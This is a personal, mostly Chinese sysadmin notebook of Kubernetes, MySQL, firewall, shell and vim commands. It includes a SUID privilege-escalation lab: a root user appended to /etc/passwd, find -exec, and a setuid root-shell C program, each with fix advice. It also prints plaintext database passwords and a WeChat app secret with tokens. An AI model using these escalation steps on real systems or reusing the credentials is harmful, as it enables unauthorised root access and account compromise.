# temp note

角色 IP
k8s-master  192.168.31.61（原）   10.0.2.4    master
k8s-node1   192.168.31.62（原）   10.0.2.x    mode1
k8s-node2   192.168.31.63（原）   10.0.2.x    node2

kubeadm init \
--apiserver-advertise-address=10.0.2.4 \
--image-repository registry.aliyuncs.com/google_containers \
--kubernetes-version v1.19.3 \
--service-cidr=10.96.0.0/12 \
--pod-network-cidr=10.244.0.0/16

kubectl get nodes
[kube-flannel.yml](https://github.com/coreos/flannel/blob/v0.12.0/Documentation/kube-flannel.yml)

topk(5,(rate(namedprocess_namegroup_cpu_seconds_total{groupname="docker",instance=~"192.168.10.137"}[$interval])+
rate(namedprocess_namegroup_thread_cpu_seconds_total{groupname="docker",instance=~"192.168.10.137"}[$interval])
)
)

topk(5,(rate(namedprocess_namegroup_cpu_seconds_total{groupname="docker",instance=~"192.168.10.137:9256"}[5m])+
rate(namedprocess_namegroup_thread_cpu_seconds_total{groupname="docker",instance=~"192.168.10.137:9256"}[5m])
)
)

topk(5,(irate(namedprocess_namegroup_cpu_seconds_total{groupname=~"$processes",instance=~"$host"}[$__interval])+rate(namedprocess_namegroup_thread_cpu_seconds_total{groupname=~"$processes",instance=~"$host"}[$__interval])
))

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
mysql:
cp  support-files/mysql.server /etc/init.d/mysqld

select user,host,password from mysql.user;
CREATE USER 'sks_sone'@'localhost' IDENTIFIED BY 'sksHykf8gw6l8bfs3ef';
grant all privileges on *.* to 'sks_sone'@'%' identified by 'sksHykf8gw6l8bfs3ef' with grant option;
grant all privileges on *.* to 'bzzn_sone'@'%' identified by 'bzznHykf8gw6l8bfs3ef' with grant option;

grant all privileges on smartone_common.* to 'sks_sone'@'%' identified by 'sksHykf8gw6l8bfs3ef' with grant option;

flush privileges;

CREATE USER 'sks_sone'@'192.168.10.108' IDENTIFIED BY 'sksHykf8gw6l8bfs3ef';

set password for sks_sone@'localhost'=password('sksHykf8gw6l8bfs3ef');
set password for sks_sone@'192.168.10.108'=password('sksHykf8gw6l8bfs3ef');

/bin/sh /application/apache-tomcat-8.5.20/bin/startup.sh && tail -f /application/apache-tomcat-8.5.20/logs/catalina.out
docker run -d --restart always --privileged -v /home/lscgdj-xin_sp:/application/apache-tomcat-8.5.20/webapps -p 51223:8080 --name lscgdj-xin_sp chenlulu/tomcat:v2 /bin/sh /application/apache-tomcat-8.5.20/bin/startup.sh && tail -f /application/apache-tomcat-8.5.20/logs/catalina.out

firewall-cmd --zone=public --add-port=3306/tcp --add-port=4444/tcp --add-port=4567/tcp --add-port=4568/tcp --permanent
firewall-cmd --zone=public --add-port=80/tcp --add-port=8080/tcp --add-port=3306/tcp --add-port=9999/tcp --add-port=8848/tcp --add-port=3000/tcp --add-port=4000/tcp --add-port=4100/tcp --add-port=4200/tcp --add-port=4300/tcp --add-port=4400/tcp --add-port=9000/tcp --add-port=6379/tcp --add-port=5003/tcp --permanent
/usr/local/mysql/bin/mysqldump -uroot -psks.slave  sksdb_crm --skip-lock-tables         > sksdb_crm_bakup.sql
grant all privileges on *.* to root@"%" identified by "sks123.com";

./soffice -headless -accept="socket,host=127.0.0.1,port=8100:urp;" -nofirststartwizard &

firewall-cmd --zone=public --add-port=8012/tcp --add-port=8100/tcp --add-port=9000/tcp --permanent
firewall-cmd --permanent --zone=public address="192.168.10.107" port protocol="tcp" port="111"
grant all privileges on *.* to sone1@"%" identified by "sks123.com";
create database smartone_common CHARACTER SET utf8mb4 COLLATE utf8mb4_bin;
change master to master_host='192.168.10.108',master_user='root',master_password='sks123.com',master_log_file='mysql-bin.000004',master_log_pos=986;
grant replication slave,replication client on *.* to root@'192.168.10.107' identified by 'sks123.com';

firewall-cmd --zone=public --add-port=9999/tcp --add-port=8848/tcp --add-port=3000/tcp --add-port=8012/tcp --add-port=4000/tcp --add-port=9000/tcp --add-port=4000-5000/tcp --permanent
firewall-cmd --zone=public --remove-port=33060/tcp --permanent

/usr/local/mysql/bin/mysqldump -u$user -p$passwd  information_schema --skip-lock-tables         > "$backup_dir/"information_schema_"$time.sql"

create database smartone_nacos CHARACTER SET utf8mb4 COLLATE utf8mb4_bin;
create database smartone_license CHARACTER SET utf8mb4 COLLATE utf8mb4_bin;
grant all privileges on smartone_nacos.* to 'sks_sone'@'%' identified by 'sksHykf8gw6l8bfs3ef' with grant option;
grant all privileges on smartone_license.* to 'sks_sone'@'%' identified by 'sksHykf8gw6l8bfs3ef' with grant option;
set password for 'root'@'localhost'=password('jzbio123.com')
update user set password=password(‘123’) where user=’root’ and host=’localhost’;


- 查看用户的权限，及撤销权限

show grants for sks_sone;
revoke all on *.* from dba@localhost;
    这样就保证了权限为 USAGE，也可执行以下指令
    GRANT USAGE ON *.* TO 'user01'@'localhost' IDENTIFIED BY'123456' WITH GRANT OPTION;
    然后，主从, 要登录的是普通用户， 才会看到read-only 效果

- 查看数据库版本

  进入数据库，show version();   select version();

- 给文件中ip server，发送id_rsa.pub

  for i in `cat ip_sp.txt`;do ssh-copy-id -i ~/.ssh/id_rsa.pub root@$i;done

- 显示过滤掉# 开头和空格后的配置信息

`grep -Ev "^$|^[#;]" redis.conf`
但是，这会把脚本开头那行也给注释了...

微信公众号-与开发者模式绑定，因此要用到接口去配置，比如说菜单...
微信接口调试页面，[前往](https://mp.weixin.qq.com/debug?token=980797293&lang=zh_CN)
appid+secret，拼接的[地址为](https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=wxdf1ad0c1c7590f4e&secret=bc8310072386062e0ddf5fea6ff60b42)

```text
    可以获得access_token，
此为，access_token，
    {"access_token":"39_onEaw_AXP5lVQcmCInEQGN1STGXQ8RHQRxT-f2Fzwpp7pNM_owFwVAbXBNj9Jwm_Ty-ocF-9M3pCKVhlGsG6e6zNDy7g8mWfr6ZTqBw3Dm_VgxUdBX9_vFVGJ4zpJAGUvMVdcOAuU-YZ7UpZNUOdAHAVCW","expires_in":7200}
    https://api.weixin.qq.com/cgi-bin/menu/addconditional?access_token=39_FSSg_9mrCYoLlHIoPtsmYKsjhAJZSQHRA7reA1fFpzyypwwvyT3MImfzi69k8xMbMFxpTjJG1hS3ar0VwZPNMMvsQ6eO-H1r0XZONcgtEWhZbC8biFAG4BAaMpy_LljMnkxX7AiiP2a2ZQdwPKBgAJAAVM
在微信接口调试页面，可以利用access_token，获取到菜单的详细信息，注意token需要手动获取，因为每次的都不一样
利用access_token，还是刚才的微信接口调试页面，上传图片，获取到media_id
接着，在上上步的菜单详细信息中，添加上如下格式，即是新菜单的详细信息。然后，还是回到微信接口调试页面上去，去调用生成菜单的接口
        {
           "type": "media_id",
           "name": "图片",
           "media_id": "MEDIA_ID1"
        }
```

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- yum 更新时报错，需要删除软件包。操作还是谨慎点，不要轻易点yes

    1. package-cleanup --cleandupes
    2. 可以只升级某一个软件包，，  yum update -y docker-ce

- 获取结果的最后一列, 例如  docker ps -a | awk '{print $NF}'

- 哦，remote-ssh连接上后，打开文件夹，之后再开终端才会是你写代码的那个路径

汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇汇报报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报汇报
weekly：

- 已完成：


5. 
---

- 其他：


1. 精通docker，
2. 了解存储（NAS）、备份、容灾等领域技术
3. 有服务器、存储、云计算等知识

- 未完成：

1. 接触新概念，dind (docker in docker)，需要多多看官方文档。
    1. ssh-private-key [demo](https://gitlab.com/gitlab-examples/ssh-private-key/-/jobs/376632425)
    2. [gitlab ci/cd examples](https://docs.gitlab.com/ee/ci/examples/README.html)
        里面还有[Java with Maven](https://gitlab.com/gitlab-examples/maven/simple-maven-example)
    3. 有空再试试，


---

- 下周计划：
运维工作;
项目上的安排

- 进行中：

1. 用xmind整理下更好，梳理下

2. **shell高级编程**
3. docker 技术入门到实践第3版,补充一下 docker_mk.txt 文档

    1. 可以把西藏项目用到的试试写个dockerfile，比如 微心愿
    2. 最近部署smartone测试环境，可以搞个dockerfile，就不必这么麻烦了

4. smartone， 环境部署脚本， 方便其他客户（比如，windows） 快速搭建部署环境
5. **隐藏linux进程**。 大隐于内核，还是小隐于用户。

---

1. 运维/devops 技术栈？
2. 内核有点难。搭建实验环境，好像也不太顺利，这个坑慢慢填

3. linux_security， 服务器安全方面、安全加固， 的一些操作， **能深入实践更好**
4. linux shell 脚本
5. linux的 底层容器技术， 完善下

6. 每周一--周四，整理分享笔记，不管轮没轮到都整一篇。

1. linux-secure-方法论,这块要深究的话,其实还有很多
    不过,从使用配置层面,也要先达到最低标准
    另,从攻击角度来搞,或许能理解得更深, ？？


clouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclouclcloucloucloucloucloucloucloucloucloucloucloucloucl

- 系统更新,要一个一个部门去更新,有点烦
    1. 先不论内网部署的. 外网部署的各个部门,要保证版本是统一的
    2. 每次遇到问题后,都是即时更新,没有新开一个分支.不知道版本是如何管理控制的

unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix

5. linux命令行，^替换掉上调命令的部分内容
    zsh里头，需要按tab将内容给你补充显示出来，要不回车后，他还是需要你确认的
    1. ^old^new             换掉输错或输少的部分
        ansible vod -m command -a 'uptim'       如果是uptimee，就不好说了？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
        ^im^ime
        !:s/is/e            这也能达到效果

    2. !:gs/old/new         将old内容全部换成new，              用久了就发现，其实这些和vim中的操作是类似的
        ansible nginx -m command -a 'which nginx'
        !:gs/nginx/squid
        ^nginx^squid^:G     # zsh

    3. !! 执行上一条命令，
        比如，sudo !!
        !10，执行第10条命令

    4. 技巧
        [这个牛逼](http://www.rayninfo.co.uk/vimtips.html) 

        ```bash
        cd !$，              !$得到上条命令的最后一位参数
        cd !^，             得到上条命令的第一个参数
        vim !:2             !:n，得到上条命令第n个参数
        vim !:1-2           !:x-y，得到上条命令从x到y的参数
        vim !:n*            !:n*,从n开始到最后的参数
        cp -r !*            !*,得到上条命令所有参数
        ```

        1. vim 中，:s/Administrator/$FTP_USER/g                 替换当前行所有的
                去掉g，就是替换光标所在行的，第一个
            :19,21s/username/USERNAME/                         替换19-21行所有的
            :19,$s/username/USERNAME/                          替换19-最后一行所有的

    5. !$:h,                  选取路径开头
        比如，ls /usr/share/fonts/urw-base35
            cd !$:h,    会到，cd /usr/share/fonts

        1. !$:t,                选取路径结尾
            tar -zxvf !$:t,     会到，tar zxvf nginx-1.4.7.tar.gz  这里直接用 tar !$ 就完事了
            cd !$:r，           选取到文件名，比如：unzip lzl01.zip,  cd !$:r

        2. echo !$:e，          选取扩展名
    6. vim                      进入文件，选中字符或行， ~  可转换大小写，大写的小写小写的大写
    7. ddp                      将光标所在行，剪切，然后粘贴到光标的下一行
        yyp, 则是复制，粘贴到光标的下一行
    8. ^ w e $ 行首（行的字符的首位）、下一个单词词首、下一个单词词尾、行尾
    9. /relabel_configs/e       加上 /e 表示光标为匹配结束位（词尾）
        1. 3/relabel_configs/e+3   第三个匹配位置，且光标位于匹配结束为（词尾）的后3个位置
        2. /address/s-3             匹配开始位（词首），前三个位置
    10. d/someword/                 适用于光标之后（一行内使用比较多），匹配到 "soneword"字符的，前面内容全部删除
        
        1. y/domeword/              复制
    



    6. ctrl+w，             删除操作，光标前的一个单词（终端操作）
    7. cp lzl01.zip{,.bak}，创建备份文件，使用{} 构造字符串
        touch {1..10..2}.txt
    
    8. 使用`` 或者 $() 做命令替换； 嵌套时，$()可读性更清晰
    9. readlink -f  /usr/bin/java                                  递归跟随符号链接以标注化。就是一直跟随符号链接，知道非符号链接的位置，限制是最后必须存在一个非符号链接的文件
    10. /etc/bashrc 文件添加一行，export HISTTIMEFORMAT="”%F %T "   查看历史命令时看到具体时间
    11. screen, 同屏操作，nice
        screen -S l01 创建会话,  screen -x l01 加入会话， exit退出
        两个终端加入到同一个会话中，就可实现共享
        screen -ls 显示所有已打开的会话
        ctrl+a,d    剥离当前screen会话
        screen -r l01 恢复某screen会话                              可以用于在远程服务器上，登录后，创建一个自己的会话，退出时保存工作C+a,d，方便下次远程时连接入此会话
        注意，这个时候exit 就是一个比较危险的操作了
        screen -X -S 19510 quit                                     不加入会话，在外部杀死一个screen
    
        常用操作二、让代码再后台运行。
    
        Attached    已连接的，  Detached  分离的，                        注意看screen 后面的状态
    12. whois 119.3.247.174                                         查询到域名的注册信息
        whois qq.com




6. 查看服务器CPU，运存情况
    1. cat /proc/cpuinfo  | grep processor | wc -l      4个CPU处理器
        cat /proc/cpuinfo | grep cores                  每个CPU含4个核心，所以是，16核处理器
        或者通过lscpu，CPU(s): 4,   Core(s) per socket: 4， Socket(s): 1，      所以，其逻辑CPU的数量就是Socket*core*thread  也就是threads

6. echo ${BASH_SOURCE[0]}                               获取到脚本自身文件名
    注意，不同的是，echo $0

7. 通过端口查找进程PID，通过PID查找端口，就这几个命令
    ps -ef | grep 9090
    ss -tulnp | grep 9090
    lsof -n -i :9090 | grep -i listen
    1. 为什么top 查出来的pid，用ss命令查找不到呢，查不到对应的进程，
        哦，用netstat 也是查不到的
        但是用ps，就能查找到，
    2. ps aux | grep 9090,                              能查出两个进程，一个 24010 /usr/bin/docker-proxy ...；一个 24045 /bin/prometheus ...（本机并未安装prometheus）
        在top 里面显示的PID是 24045；而你用ss， 或者netstat呢，查PID理应是用24010查，用24045 就查不出来（ss 应该是用来，通过端口查进程PID的）
        或者也可以理解为，PID 24045的进程 /bin/prometheus，不占用本机的端口？
        经发现，该容器映射的端口为，0.0.0.0:9090->9090/tcp，    这也说明以后尽量不要将容器内和映射端口搞成一致的。
    


8. ll -ht | head -n 2， 查看结果中排在前面的

8. centos7安装sql-server，
    [参考](https://blog.51cto.com/13770206/2429881)


11. linux系统架构从外到内，可以分为，应用层（封装起来的shell）、 shell、 kernel、 hardware

13. 反引号 `` 和 &()
    TIME=$(date +%Y-%m-%d_%H-%M-%S)
    `cat /etc/issue | grep -w "\\\S" | wc -l`       反引号本身就对\ 做了一层转义，所以两个\\ 才是进行转义
    $(cat /etc/issue | grep -w "\\\S" | wc -l`)
    反引号是老的用法，$() 是新用法

13. `/usr/sbin/useradd -D` 能看到SKEL= ,意思是系统会将 /etc/skel 目录中的内容(可以看作模板)复制到用户的HOME 目录. 因此作为管理员可以自定义这些内容

2. 

5. 删除 /data/lscgdj目录下， 10天之前修改过的tar.gz 包
   find /data/lscgdj -name "*-backup-onlywebinf.tar.gz" -a -mtime +9 -exec rm -rf {} \; &>/dev/null
   -atime +1             最后一次访问时间
   -ctime +1             最后一次状态修改时间
   -mtime                最后一次内容修改时间

16. win10环境，使用 vscode remote ssh 远程连接服务器，免密连接

    cmd, ssh-keygen -t rsa,                             生成秘钥
    将win10 上的 用户/user01/.ssh/id_rsa.pub 上传到服务器的 /root/.ssh/  目录下，
        cat id_rsa.pub  >> authorized_keys

    ​    ssh-copy-id -i ~/.ssh/id_rsa.pub root@$i  还是要看这个~

    本来，试讲win10上面的资料mount 挂载到虚拟机 centos7mini 上去的。 现在发现，用远程服务器可以同样实现，大功告成。 不过这样的话，虽然本地资源压力减轻，但是安全性就没了。

9. suid 提权示例，
   1. 比如cp
   find / -type f -perm -u=s 2>/dev/null               搜索具有suid权限的可执行文件，
   chmod u+s /bin/cp                                   root用户给cp一个权限，做测试
   ll /usr/bin/cp

   cp /etc/passwd passwd                               普通用户，开始操作
   openssl passwd -1 -salt l01 123456
   echo 'l01:$1$l01$.a5onqEPLUMqiokxhSrBy.:0:0::/root/:/bin/bash' >>passwd          按照passwd 文件格式来添加一条
   cp passwd  /etc/passwd                               将passwd 复制回去，

   su - l01                                             接下来，就可以切换到新建的用户了， 并且l01用户权限为root， 已提权
   id                                                   能看到uid, gid, uid=0(root) gid=0(root) groups=0(root)
   cat /etc/passwd | tail -1
   同理，awk， sed这类具有写文件权限的命令以suid权限，都可以造成提权
   2. find suid 给find提权后，可以以 exec 参数，以root权限执行任意命令
   chmod u+s /bin/find                                  先给一个权限， 做测试
   find ./ -name "passwd" -exec "id" \;                 find ./ -type f -name "nohup" -exec cp '{}' /etc/passwd \;可执行任一命令
   执行，vim 再打开文件就可以编辑平常不能编辑的文件

   **修复建议： 将cp的 suid去除**
   3. 给vim 授权限后， 一切皆文件，好开始接龙吧
   4. 二进制程序权限滥用特权提升
   cat > sudo.c <<eof
   #include <stdio.h>
   #include <sys/types.h>
   #include <unistd.h>
   int main(void)
   {
       setuid(0);
       system("/bin/bash");
       return 0;
   }
   gcc -o sudo sudo.c      chmod +s sudo
   ./sudo                                                普通用户执行二进制文件， 就可以获取到root权限

   **修复建议： 取消suid文件suid权限**
   **合理配置nfs权限，禁止写入**
   **清除历史记录，不直接在命令行中使用命令**
   5. 内核提权，
   **修复建议， 升级内核版本，使用最新版的ubuntu**
   6. lxc提权，
   7. docker提权

faqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaq

- 在使用win10文件夹共享到linux上去时，git clone 下载了个仓库，而后就发现，怎么也删不掉了
    1. 而且在文件夹路径下， .git/objects/pack/tmp_packxxxx 总会出现这个文件
    2. 并且，在删除时，总提示，需要liuzel01 或是administrators的权限，改了好几遍所有者都不对

- 解决：
    1. 用火绒，右键对应的文件夹，“使用火绒安全粉碎文件”-“解除占用”，就好了。
        再次删除，就很顺畅就可以删文件夹了
    2. 总结：有系统占用。不过我在linux上 lsof /win10/siping/xxxx 并没有发现有什么占用。fuser -k /win10/siping/xxxx 也不管用...
        思路是对的，不过问题出在win10这边。可能是因为用了samba 共享的缘故
        所以，肯定是win10 的system把文件夹占用了

技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧



ansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansibleansible

1. locate, 搜索包含关键字的所有文件和目录。后接需要查找的文件名，也可以用正则表达式     `yum install -y mlocate`
    准确度依赖于系统上预建的文件索引数据库文件, ll /var/lib/mlocate/mlocate.db
    1. locate qq.sh                     去文件数据库中查找命令，而不是全磁盘查找。因为刚创建的文件并不会更新进数据库，所以需要手动更新数据库
        updatedb                        更新数据库
    2. locate -r "\.sh$"                通过正则模式来匹配查找
        locate -r "^/home/ch.*\.sh"     通过正则来匹配对应路径
        locate -r "^/home/.*\.sh$"      查找目录 /home 下所有脚本
    3. find /var/ -mtime -7 -not -user root -not -user postfix -ls      查找对应目录下近一周内其内容修改过，且属主不为root也不是postfix的文件
        find /etc -size +1M -exec echo {} >> /tmp/etc.largefiles {} \;  查找目录下大于1M的文件，并将文件名写入文件中。 去一个中括号就对了

2. sed -n '/\文件/p' tmp_temp           查找并打印出，包括关键字"文件"所在所有行 ，使用反斜线屏蔽特殊含义
    grep -w 服务器 tmp_temp             只匹配整个单词，而不是字符串的一部分。 -n 显示行号信息 -c 查找总行数


## 获取系统的ip地址

`ifconfig $(route -n | grep ^0.0.0.0 | awk '{print $NF}') | grep -E "netmask|Mask" |tr -s ' '|cut -d' ' -f3 |cut -d: -f2`
    tr -s ' '  将多个空格压缩成一个
    用于转换或删除文件中的字符，从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备

- 释放服务器buff/cache 中的内存，
    sync
    echo 1 > /proc/sys/vm/drop_caches

！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！

pgrep -l java
虽然相对 jps 不好用，不过pgrep 在查看其余进程信息，并与kill命令连用时较为方便

[此网站不错](https://www.shellcheck.net/#)，可以作为检查shell 脚本标准，来测试

在用vpn连接到内网服务器，scp 传输文件会一直卡住。 有一个解决方案：在指令中添加 -l 81920， 表示scp会话带宽限制高达 81920kbit/s

## nmap 探索

1. nmap -p 80,443,4455-5555 -n 140.246.90.106  -n不做DNS反解

---
1. nmap 的6中端口状态
    open                开放
    closed              关闭状态。但是，不排除对方系统做了一定的安全防护
    filtered            被过滤。对方主机可能存在防火墙设备将nmap包阻隔，也可能是网络拥塞造成。建议在不同时段再次扫描
    unfiltered          未被过滤。证明端口可访问，但无法判断open还是closed。使用ACK扫描会出现此，建议换一种扫描方式
    open|filtered       不确定态。可能收到专业设备阻挡，nmap发出去的报文未得到响应。更换扫描方式再次尝试。
    closed|filtered     不确定是关闭还是被过滤，不常用



## 小记

1. docker 容器动态扩容
想把整个过程自动化起来？当然没问题。

CID=$(docker run -d ubuntu df -h /) 
DEV=$(basename $(echo /dev/mapper/docker-*-$CID)) 
dmsetup table $DEV | sed "s/0 [0-9]* thin/0 $((42*1024*1024*1024/512)) thin/" | dmsetup load $DEV 
dmsetup resume $DEV 
resize2fs /dev/mapper/$DEV 
docker start $CID 
docker logs $CID 
扩容镜像

2. 
很多东西（教程），生搬是硬套不进去的，往往是学习他的思路，他的思考方向。

1. [linux Root的哪些事儿](https://evilpan.com/2020/12/06/android-rooting/#%E6%80%BB%E7%BB%93)
ACL: 实现，控制某个文件，可以让用户A访问而不让用户B访问
通过文件权限码可以实现一定程度上的自主访问控制，但是对于多用户系统而言只能通过用户组去管理，无法控制某个文件可以让用户A访问而不让用户B访问。
例如，单独给某用户添加文件的读权限：
    setfacl -m u:l01:w /etc/passwd
    getfacl /etc/passwd
    这个小知识，不常用，但是很好用
    移除： setfacl -x u:l01 /etc/passwd
        setfacl -b /etc/passwd 移除所有

查找当前目录下，相关log文件，并列出来
find . -name "*log*" -exec ls -l {} \;
查找当前目录下，相关log文件，且时间在10之前的，列出来
find . -mtime +10 -type f -name "*log*" -exec ls -l {} \;
查找当前目录下，空目录，并删除
find . -mtime +10 -type d -empty | xargs -n 1 rm -rf
查找当前目录下，文件大小为0的文件，并删除
find . -mtime +10 -type f -name "*" -size 0c | xargs -n 1 rm -f


sudo tcpdump -i eth0 -n port 5601 -vv
    可观察到当前机器指定端口，和外部网络的所有流量交互

ss -tlnp | grep 9090  | awk -F ',' '{print $2}' | awk -F '=' '{print $2}'
    查看指定端口的PID

makepkg -si

pacman 安装包，下载地址，https://sources.archlinux.org/other/pacman/
    安装步骤，$ meson build

​			$ ninja -C build

​			$ ninja -C build install

​        地址， https://archlinux.org/pacman/#_releases

Downloads

yay 安装包，及步骤， https://github.com/Jguer/yay
    pacman -S --needed git base-devel
    git clone https://aur.archlinux.org/yay.git
    cd yay
    makepkg -si
/home/liuzel01/yay

问题描述， Pacman sync databases, unrecognized archive format
    解决参考， https://www.reddit.com/r/archlinux/comments/oon3sx/pacman_sync_databases_unrecognized_archive_format/


archlinuxcn, mirrorlist-repo  https://github.com/archlinuxcn/mirrorlist-repo

- 技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧技巧

ll sd_files/xz_web_检测网站.yml

cat !$  查看上面那个文件，注意有个空格

- sed -i.bak 's/SELINUX=enforcing/SELINUX=disabled/' /etc/selinux/config		将config文件内容替换，并将原文件 备份为config.bak
  	-i[SUFFIX], --in-place[=SUFFIX]

  ​	edit files in place (makes backup if SUFFIX supplied)			这是sed 的帮助页，显示的注释，可参考

- mv /home/qq.sh{,.bak}  将文件重命名为 /home/qq.sh.bak

- 在终端，前往命令最前 ctrl+a, 前往命令末尾 ctrl+e

- use alias to fix typos ，使用别名来修复拼写错误， e.g. alias gerp=grep

- yes | command_or_script 运行脚本并确定每次询问都是yes，

- > filename ,只需要清空文件内容，而不删除他        cat /dev/null > filename

- grep -irP 'done' command-file/ ,查找文件内是否包含特定文本

    - find command-file/ -name *.md | xargs grep -i '${特定的文本}'

- echo admin:`openssl passwd -crypt admin` > .htpasswd_grafana ,nginx 基础认证，在登录其代理的网站时，要输入密码，

    - sudo htpasswd -c /usr/local/nginx/.htpasswd admin

- 将上一条命令的执行结果，作为此条命令的参数，
    - locate nginx.service
    - cat \`!!\`  可达到效果... 只适用于上一条指令结果为一条的情况

- journalctl -b -r -1 ，逆序展示上次开机的日志，-1 表示偏差值为1， -b表示开机至今的日志， -r逆序

- 如果你的shell是 zsh，在终端输入bash 回车，就可临时切换到bash环境

---

- docker stats， 查看容器所占用CPU, MEM等资源信息

---

1. 安装特定的工具，且制作后体积增长不大[为容器镜像定制安装linux工具](http://docs.lvrui.io/2018/10/19/%E4%B8%BA%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%AE%9A%E5%88%B6%E5%AE%89%E8%A3%85Linux%E5%B7%A5%E5%85%B7/)，

---
1. /proc 目录存放一些系统参数
    head -n 3 /proc/meminfo 
    grep 'model name' /proc/cpuinfo



1. strace
	strace -p 912 -f
	其中，912 是sshd服务的pid
	strace df -h
	strace -t -p 3621		-t，显示时间
2. iostat -p sda			仅显示单个设备的I/O统计信息
	iostat -N				仅显示LVM统计信息，
	vmstat -d 				显示所有磁盘统计信息， 展示服务器的状态值（CPU使用率、内存使用、虚拟内存交换情况、IO读写情况）
	vmstat -t 1 5 			显示时间戳，并打印具体信息
	vmstat 2 				每隔2秒采集一次服务器状态
3. lsof  list open files 
	使用场景之一： 当磁盘无法卸载时，可用此查看正在使用文件
	lsof -u ossec			显示用户ossec 的所有打开文件的列表
	lsof -i TCP:514			找到指定端口的所有正在运行的进程		ss -tlnp | grep 514
	lsof -i -u ^root		排除某用户，查找所有
	lsof -p 3311			根据PID 来筛选
	kill -9 `lsof -t -u ossec`		将用户 ossec的所有进程杀死
4. 为避免淘汰，做高质量键盘侠，要经常用这些命令
	ip n					ip a， 可显示出ip(Displays details on all network interfaces. )
	ip r					现在用ip r 来代替route
	ip n show dev eth0		显示接口eth0 的ARP缓存 ip a show ...
	ip n del 10.1.2.3 dev eth0		是设备eth0 上主机10.1.2.3 的ARP缓存无效
									也可添加一条缓存条目
5. ss 命令(可用来代替netstat)，可查看端口状态， [可参考](https://www.cnblogs.com/sztom/p/10810508.html#:~:text=%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E7%9B%91%E5%90%AC%E7%9A%84%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%9C%AC%E5%9C%B0IP%E5%9C%B0%E5%9D%80%E5%8F%8Atcp%E6%95%B0%E5%AD%97%E7%AB%AF%E5%8F%A3%E5%8F%B7(t%3Atcp%3B%20n%3A%E6%95%B0%E5%AD%97%E6%98%BE%E7%A4%BA%EF%BC%9Bl%E7%9B%91%E5%90%AC)) 
	ss -tlnp				ss -tanp， 显示所有的tcp连接，	-l listening, -t TCP connection 
	ss -tlr					显示名称，
	ss -tlnp sport eq 3000	ss -tanp sport eq 3000
	ss -tlnu sport lt 300	端口过滤，lt小于， gt 大于，ne不等于， eq等于， le小于或等于， ge大于或等于
							p 显示pid
	ss dport eq 9115		通过dst/src/dport/sport 来过滤连接的来源和目标，来源端口和目标端口
							ss dport OP PORT    OP可以
6. tcpdump -i eth0 tcp		根据TCP 端口捕获数据包，
	tcpdump -i eth0 port 9115
	tcpdump -i eth0 src 192.168.10.68		dst 192.168.10.68

- about DE on linux

cd /usr/share/xsessions/        这里存放的是，当你登录时所可选的wm
                                [在plasma中使用其他窗口管理器](https://userbase.kde.org/Tutorials/Using_Other_Window_Managers_with_Plasma/zh-cn)

displau manager:    lightdm, 或者SDDM 作为登录管理器
            plasma，KDE plasma，作为DE
WM:         i3WM，                          默认是KWin
terminal:   Kitty, 而不必非要用st(simple terminal) 
powermenu:  rofi

- grep -r 

    -r 选项的确会进入子目录进行递归匹配查询，但前提是： 子目录（文件夹）名称也要满足匹配规则才行。 所以要引入管道来查
    find command-file/ -type f -name "*.sh" | xargs grep 'ping -c1'
    非要用grep，也不是不可以， grep -iR 'ping -c1' command-file/ 时间稍长

- locate 搜索不到文件，
    修改配置文件，/etc/updatedb.conf 配置文件中有对搜索对象进行限制。 将配置注释掉即可

- chroot 在制定根目录下运行， change root directory， chroot后，系统目录结构将以指定的目录位置作为 / 位置
    一个正在运行的进程经过chroot 操作后，其根目录将被显式映射为某个指定目录，它将不能够对该目录之外的文件进行访问动作。

- 小工具，
    1. yum install ShellCheck,
        sck count_sum.sh
    2. mycli mysql客户端，支持语法高亮和命令补全，效果类似ipython， 可替代mysql命令
    

- 测量云服务器网速，
    1. [speedtest-cli](https://github.com/sivel/speedtest-cli) 
    speedtest-cli --list | grep -i 'china'  查找国内的测速节点
    speedtest-cli --share


        
    4. /lib/systemd/system/zzz.service  其中的ExecStart /bin/bash -c '' 语法还有点问题
    systemctl cat docker.service        没必要进入 /lib/systemd/system/ 目录中
    systemctl list-dependencies docker.service      查看服务的依赖
    
    5. 有时候，systemctl stop 命令没有响应，可以用来给进程发出kill信号， systemctl kill httpd.service 
- ubuntu- systemctl 
    1. enable 之后，貌似还是不生效，有待验证


